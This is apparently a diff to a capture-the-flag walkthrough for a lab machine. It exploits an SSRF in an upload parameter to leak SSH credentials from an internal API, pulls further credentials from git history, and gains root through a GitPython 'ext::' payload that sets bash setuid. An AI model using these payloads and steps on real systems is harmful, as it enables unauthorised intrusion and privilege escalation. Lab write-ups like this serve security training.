@@ -29,5 +29,97 @@ Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
 
 in upload page we have vulnerable Cover URL parameter that vulnerable to SSRF
 
+in url parameter we need to check http://127.0.0.1:5000/
+
+in the response we got:
+{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
+
+now we need to send http://127.0.0.1:5000/api/latest/metadata/messages/authors
+
+we get:
+{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
+
+so we get the username and password:
+
+Username: dev
+Password: dev080217_devAPI!@
+
+using ssh and get the user flag
+
+db713ece0ed9c4ce0dc8c2448f41a83f
+
+now we need to escalate privileges
+
+cat /etc/passwd | grep bash$
+root:x:0:0:root:/root:/bin/bash
+prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash
+
+in directory apps we have .git directory
+
+we need to use git logs 
+
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+    
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+
+after that we need git show 1e84a036b2f33c59e2390730699a488c65643d28
+
+found the another username and password:
+
+return jsonify({
++        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
++    }) # TODO: replace dev credentials when checks pass
+
+entering via ssh with this user
+
+using sudo -l 
+
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3
+        /opt/internal_apps/clone_changes/clone_prod_change.py
+        *
+
+inside the code we have:
+
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+
+there is a PoC to this vulnerability in GitPython https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+so all we need to do is:
+'ext::sh -c chmod% +s% /bin/bash'
+
+and then 
+
+/bin/bash -p 
+
+and we get the root
+
+rootflag:
+
+c93f273aaf5a4112e1fc70bc8aaec2d9
+
 
 
